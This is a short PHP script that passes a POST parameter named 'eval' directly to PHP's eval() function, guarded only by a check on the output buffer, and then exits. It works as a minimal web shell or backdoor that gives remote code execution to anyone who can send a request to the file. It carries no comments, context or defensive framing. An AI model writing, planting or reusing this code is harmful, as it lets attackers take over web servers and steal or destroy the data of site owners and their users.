<?php
$tmp = ob_get_contents(); 
$eval = $_POST['eval'];
if ($tmp){
	ob_clean(); 
	eval($eval); 
	$ret = ob_get_contents(); 
}
exit;
?>
